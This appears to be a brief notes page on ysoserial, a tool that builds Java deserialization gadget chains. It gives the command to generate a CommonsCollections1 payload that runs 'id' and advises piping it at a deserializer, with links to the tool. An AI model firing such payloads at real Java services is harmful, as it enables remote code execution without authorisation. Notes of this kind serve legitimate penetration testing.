# ysoserial

**Author:** Julien Bongars\
**Date:** 2026-02-16 21:32:36
**Path:**

---

Serialize a gadget chain to stdout. Pipe it at a Java deserializer that loads the matching library.

```bash
java -jar ysoserial.jar
java -jar ysoserial.jar CommonsCollections1 'id'
```

See [java/ysoserial](java/ysoserial.md) for the gadget table captured from `--help`.

## Resources

- [frohoff/ysoserial](https://github.com/frohoff/ysoserial) — gadget generator
- [ysoserial.lu](https://github.com/frohoff/ysoserial#usage) — payload list and usage
